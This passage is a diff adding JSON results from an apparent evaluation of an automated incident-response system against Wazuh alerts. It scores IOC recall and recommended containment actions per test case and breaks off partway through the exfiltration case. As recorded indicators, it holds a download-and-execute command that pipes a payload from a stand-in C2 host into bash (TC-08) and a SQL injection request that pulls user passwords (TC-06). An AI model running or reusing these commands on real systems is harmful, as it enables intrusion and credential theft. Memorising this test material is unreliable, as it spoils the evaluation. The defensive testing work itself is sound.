@@ -1,0 +1,1425 @@
+{
+  "run": "clean-p2e-real-wazuh-20261008",
+  "database": "soar_p2e_eval",
+  "groundTruthSha256": "9a800baba905dfc8aca73810ef9f4984ac5923b3909eb013984bd11fcc69f6de",
+  "baselinesUsed": [
+    "final-main-real-wazuh-20261001",
+    "clean-v2-real-wazuh-20260930"
+  ],
+  "notRun": [
+    "TC-05"
+  ],
+  "summaryByProvenance": {
+    "REAL_TELEMETRY": {
+      "cases": [
+        "TC-01",
+        "TC-04",
+        "TC-06"
+      ],
+      "compliant": 3,
+      "iocFound": 5,
+      "iocExpected": 5,
+      "resolved": 3
+    },
+    "HARNESS_GENERATED": {
+      "cases": [
+        "TC-02",
+        "TC-03",
+        "TC-07",
+        "TC-08",
+        "TC-09",
+        "TC-10"
+      ],
+      "compliant": 6,
+      "iocFound": 17,
+      "iocExpected": 17,
+      "resolved": 5
+    }
+  },
+  "rehuntClassifications": {
+    "NO_MATCH_COVERED": 8,
+    "(not classified)": 1
+  },
+  "cases": [
+    {
+      "caseId": "TC-01",
+      "attackName": "Brute Force",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "provenance": {
+        "class": "REAL_TELEMETRY",
+        "basis": [
+          "native-format Wazuh alert id; no mock or harness marker present (a hand-written fixture that copies this id format is only caught via knownFixtureIds)"
+        ]
+      },
+      "alert": {
+        "ruleId": "5712",
+        "level": 10,
+        "agent": "attack-endpoint",
+        "indexerDocId": "a9etGqEBgh2xXWqmbrVp"
+      },
+      "completeness": {
+        "network": "OBSERVED",
+        "authentication": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 2,
+          "found": 2,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-BLOCK-SOURCE-IP"
+          ],
+          "actualActions": [
+            "ACT-BLOCK-SOURCE-IP"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "172.19.0.5"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-01",
+          "correct": true,
+          "playbookMatch": true,
+          "actionTargetMatches": true,
+          "missingRecommendations": [],
+          "unexpectedRecommendations": [],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.5"
+            }
+          ],
+          "reason": "playbook and all expected action->target pairs match; no unexpected pair"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "172.19.0.5",
+          "sourcePath": "data.srcip",
+          "role": "SOURCE",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        },
+        {
+          "type": "USERNAME",
+          "value": "git",
+          "sourcePath": "data.srcuser",
+          "role": "ACTOR",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 2,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.6",
+            "git"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 2,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.6"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-02",
+      "attackName": "Malware",
+      "telemetry": "REAL_ACTION_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval"
+        ]
+      },
+      "alert": {
+        "ruleId": "100301",
+        "level": 12,
+        "agent": "attack-endpoint",
+        "indexerDocId": "fdevGqEBgh2xXWqmTrXt"
+      },
+      "completeness": {
+        "syscheck": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 2,
+          "found": 2,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-QUARANTINE-FILE",
+            "ACT-BLOCK-HASH"
+          ],
+          "actualActions": [
+            "ACT-QUARANTINE-FILE",
+            "ACT-BLOCK-HASH"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "/root/Downloads/Invoice_Q4_2026.xls.exe",
+            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-02",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [
+            {
+              "action": "ACT-ISOLATE-ENDPOINT",
+              "acceptableTargets": [
+                "attack-endpoint"
+              ]
+            }
+          ],
+          "unexpectedRecommendations": [],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-QUARANTINE-FILE",
+              "target": "/root/Downloads/Invoice_Q4_2026.xls.exe"
+            },
+            {
+              "action": "ACT-BLOCK-HASH",
+              "target": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+            }
+          ],
+          "reason": "missing: ACT-ISOLATE-ENDPOINT -> attack-endpoint"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "FILE_PATH",
+          "value": "/root/Downloads/Invoice_Q4_2026.xls.exe",
+          "sourcePath": "syscheck.path",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "MD5",
+          "value": "44d88612fea8a8f36de82e1278abb02f",
+          "sourcePath": "syscheck.md5_after",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "SHA1",
+          "value": "3395856ce81f2b7382dee72602f798b642f14140",
+          "sourcePath": "syscheck.sha1_after",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "SHA256",
+          "value": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+          "sourcePath": "syscheck.sha256_after",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 0,
+            "missing": [
+              "hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+              "file:/root/Downloads/Invoice_Q4_2026.xls.exe"
+            ]
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": [
+            "attack-endpoint"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 0,
+            "missing": [
+              "hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+              "file:/root/Downloads/Invoice_Q4_2026.xls.exe"
+            ]
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": [
+            "attack-endpoint"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-03",
+      "attackName": "Phishing",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval",
+          "location is /var/log/vigix-eval/events.json",
+          "data.vigix block present"
+        ]
+      },
+      "alert": {
+        "ruleId": "100310",
+        "level": 10,
+        "agent": "attack-endpoint",
+        "indexerDocId": "ide1GqEBgh2xXWqmyrXE"
+      },
+      "completeness": {
+        "network": "OBSERVED",
+        "email": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 4,
+          "found": 4,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-BLOCK-URL",
+            "ACT-BLOCK-DOMAIN",
+            "ACT-QUARANTINE-EMAIL"
+          ],
+          "actualActions": [
+            "ACT-QUARANTINE-EMAIL",
+            "ACT-BLOCK-URL",
+            "ACT-BLOCK-DOMAIN"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "it-support@vigix-eval-phish.net",
+            "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+            "vigix-eval-phish.net"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-03",
+          "correct": true,
+          "playbookMatch": true,
+          "actionTargetMatches": true,
+          "missingRecommendations": [],
+          "unexpectedRecommendations": [],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-BLOCK-URL",
+              "target": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk"
+            },
+            {
+              "action": "ACT-BLOCK-DOMAIN",
+              "target": "vigix-eval-phish.net"
+            },
+            {
+              "action": "ACT-QUARANTINE-EMAIL",
+              "target": "it-support@vigix-eval-phish.net"
+            }
+          ],
+          "reason": "playbook and all expected action->target pairs match; no unexpected pair"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "203.0.113.45",
+          "sourcePath": "data.srcip",
+          "role": "SOURCE",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-phish.net",
+          "sourcePath": "data.dns.question.name",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "URL",
+          "value": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-phish.net",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "EMAIL",
+          "value": "it-support@vigix-eval-phish.net",
+          "sourcePath": "data.email.from",
+          "role": "SOURCE",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "EMAIL",
+          "value": "hr.clerk@corp.local",
+          "sourcePath": "data.email.to",
+          "role": "TARGET",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 4,
+            "found": 4,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "it-support@vigix-eval-phish.net",
+            "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+            "vigix-eval-phish.net"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "NOT_EVALUATED",
+          "iocRecall": {
+            "expected": 4,
+            "found": 4,
+            "missing": []
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": null
+        }
+      ]
+    },
+    {
+      "caseId": "TC-04",
+      "attackName": "Account Compromise",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "provenance": {
+        "class": "REAL_TELEMETRY",
+        "basis": [
+          "native-format Wazuh alert id; no mock or harness marker present (a hand-written fixture that copies this id format is only caught via knownFixtureIds)"
+        ]
+      },
+      "alert": {
+        "ruleId": "40112",
+        "level": 12,
+        "agent": "attack-endpoint",
+        "indexerDocId": "n9e5GqEBgh2xXWqmXLXW"
+      },
+      "completeness": {
+        "network": "OBSERVED",
+        "authentication": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 2,
+          "found": 2,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-DISABLE-ACCOUNT",
+            "ACT-RESET-CREDENTIAL"
+          ],
+          "actualActions": [
+            "ACT-DISABLE-ACCOUNT",
+            "ACT-REVOKE-SESSION"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "victim",
+            "victim"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-04",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [
+            {
+              "action": "ACT-RESET-CREDENTIAL",
+              "acceptableTargets": [
+                "victim"
+              ]
+            },
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "acceptableTargets": [
+                "172.19.0.5"
+              ]
+            }
+          ],
+          "unexpectedRecommendations": [
+            {
+              "action": "ACT-REVOKE-SESSION",
+              "target": "victim"
+            }
+          ],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-DISABLE-ACCOUNT",
+              "target": "victim"
+            }
+          ],
+          "reason": "missing: ACT-RESET-CREDENTIAL -> victim; ACT-BLOCK-SOURCE-IP -> 172.19.0.5 | unexpected: ACT-REVOKE-SESSION -> victim"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "172.19.0.5",
+          "sourcePath": "data.srcip",
+          "role": "SOURCE",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        },
+        {
+          "type": "USERNAME",
+          "value": "victim",
+          "sourcePath": "data.dstuser",
+          "role": "TARGET",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 2,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "victim",
+            "172.19.0.6"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 2,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "victim",
+            "172.19.0.6",
+            "victim",
+            "victim"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-06",
+      "attackName": "SQL Injection",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "provenance": {
+        "class": "REAL_TELEMETRY",
+        "basis": [
+          "native-format Wazuh alert id; no mock or harness marker present (a hand-written fixture that copies this id format is only caught via knownFixtureIds)"
+        ]
+      },
+      "alert": {
+        "ruleId": "31103",
+        "level": 7,
+        "agent": "attack-endpoint",
+        "indexerDocId": "ote7GqEBgh2xXWqmbLU1"
+      },
+      "completeness": {
+        "network": "OBSERVED",
+        "http": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 1,
+          "found": 1,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-BLOCK-SOURCE-IP"
+          ],
+          "actualActions": [
+            "ACT-BLOCK-SOURCE-IP"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "172.19.0.5"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-06",
+          "correct": true,
+          "playbookMatch": true,
+          "actionTargetMatches": true,
+          "missingRecommendations": [],
+          "unexpectedRecommendations": [],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-BLOCK-SOURCE-IP",
+              "target": "172.19.0.5"
+            }
+          ],
+          "reason": "playbook and all expected action->target pairs match; no unexpected pair"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "172.19.0.5",
+          "sourcePath": "data.srcip",
+          "role": "SOURCE",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        },
+        {
+          "type": "HTTP_REQUEST",
+          "value": "/app/search.php?id=1%20union%20select%20username,password%20from%20users",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "REAL_TELEMETRY",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 1,
+            "found": 1,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.6"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 1,
+            "found": 1,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.6"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-07",
+      "attackName": "Command & Control",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval",
+          "location is /var/log/vigix-eval/events.json",
+          "data.vigix block present"
+        ]
+      },
+      "alert": {
+        "ruleId": "100320",
+        "level": 13,
+        "agent": "attack-endpoint",
+        "indexerDocId": "tde9GqEBgh2xXWqm9LWn"
+      },
+      "completeness": {
+        "network": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 3,
+          "found": 3,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-BLOCK-DOMAIN",
+            "ACT-BLOCK-DESTINATION-IP"
+          ],
+          "actualActions": [
+            "ACT-BLOCK-DESTINATION-IP",
+            "ACT-BLOCK-DOMAIN",
+            "ACT-BLOCK-URL",
+            "ACT-ISOLATE-ENDPOINT"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "172.19.0.8",
+            "vigix-eval-c2.net",
+            "http://vigix-eval-c2.net:8080/gate.php",
+            "attack-endpoint"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-07",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [],
+          "unexpectedRecommendations": [
+            {
+              "action": "ACT-BLOCK-URL",
+              "target": "http://vigix-eval-c2.net:8080/gate.php"
+            },
+            {
+              "action": "ACT-ISOLATE-ENDPOINT",
+              "target": "attack-endpoint"
+            }
+          ],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-BLOCK-DOMAIN",
+              "target": "vigix-eval-c2.net"
+            },
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.8"
+            }
+          ],
+          "reason": "unexpected: ACT-BLOCK-URL -> http://vigix-eval-c2.net:8080/gate.php; ACT-ISOLATE-ENDPOINT -> attack-endpoint"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "172.19.0.7",
+          "sourcePath": "data.srcip",
+          "role": "ENDPOINT_SELF",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "IPV4",
+          "value": "172.19.0.8",
+          "sourcePath": "data.dstip",
+          "role": "DESTINATION",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-c2.net",
+          "sourcePath": "data.dns.question.name",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "URL",
+          "value": "http://vigix-eval-c2.net:8080/gate.php",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-c2.net",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 3,
+            "found": 3,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.5",
+            "vigix-eval-c2.net",
+            "http://vigix-eval-c2.net:8080/gate.php",
+            "attack-endpoint"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 3,
+            "found": 3,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.5",
+            "vigix-eval-c2.net",
+            "http://vigix-eval-c2.net:8080/gate.php",
+            "attack-endpoint"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-08",
+      "attackName": "Suspicious Process",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval",
+          "location is /var/log/vigix-eval/events.json",
+          "data.vigix block present"
+        ]
+      },
+      "alert": {
+        "ruleId": "100330",
+        "level": 10,
+        "agent": "attack-endpoint",
+        "indexerDocId": "vdfCGqEBgh2xXWqm9bXY"
+      },
+      "completeness": {
+        "process": "OBSERVED",
+        "file": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 4,
+          "found": 4,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-KILL-PROCESS",
+            "ACT-QUARANTINE-FILE"
+          ],
+          "actualActions": [
+            "ACT-KILL-PROCESS",
+            "ACT-BLOCK-HASH"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "/tmp/.cache/kworkerd",
+            "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
+        "correctRecommendation": {
+          "caseId": "TC-08",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [
+            {
+              "action": "ACT-QUARANTINE-FILE",
+              "acceptableTargets": [
+                "/tmp/.cache/kworkerd"
+              ]
+            }
+          ],
+          "unexpectedRecommendations": [],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-KILL-PROCESS",
+              "target": "/tmp/.cache/kworkerd"
+            },
+            {
+              "action": "ACT-BLOCK-HASH",
+              "target": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64"
+            }
+          ],
+          "reason": "missing: ACT-QUARANTINE-FILE -> /tmp/.cache/kworkerd"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "SHA256",
+          "value": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+          "sourcePath": "data.sha256",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "FILE_PATH",
+          "value": "/tmp/.cache/kworkerd",
+          "sourcePath": "data.file",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "PROCESS_NAME",
+          "value": "/tmp/.cache/kworkerd",
+          "sourcePath": "data.audit.exe",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "COMMAND_LINE",
+          "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+          "sourcePath": "data.command",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "COMMAND_LINE",
+          "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+          "sourcePath": "data.audit.command",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 2,
+            "found": 0,
+            "missing": [
+              "process:/tmp/.cache/kworkerd",
+              "command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+            ]
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "/tmp/.cache/kworkerd"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "NOT_EVALUATED",
+          "iocRecall": {
+            "expected": 2,
+            "found": 0,
+            "missing": [
+              "process:/tmp/.cache/kworkerd",
+              "command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+            ]
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": null
+        }
+      ]
+    },
+    {
+      "caseId": "TC-09",
+      "attackName": "Data Exfiltration",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval",
+          "location is /var/log/vigix-eval/events.json",
+          "data.vigix block present"
+        ]
+      },
+      "alert": {
+        "ruleId": "100340",
+        "level": 13,
+        "agent": "attack-endpoint",
+        "indexerDocId": "wNfKGqEBgh2xXWqmZLUt"
+      },
+      "completeness": {
+        "network": "OBSERVED",
+        "file": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 3,
+          "found": 3,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-BLOCK-DOMAIN",
+            "ACT-BLOCK-DESTINATION-IP"
+          ],
+          "actualActions": [
+            "ACT-BLOCK-DESTINATION-IP",
+            "ACT-BLOCK-URL",
+            "ACT-ISOLATE-ENDPOINT"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "172.19.0.8",
+            "http://vigix-eval-exfil.net:8080/upload",
+            "attack-endpoint"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": "RESOLVED",
+        "verificationMode": "REAL_WAZUH",
+        "rehuntError": null,
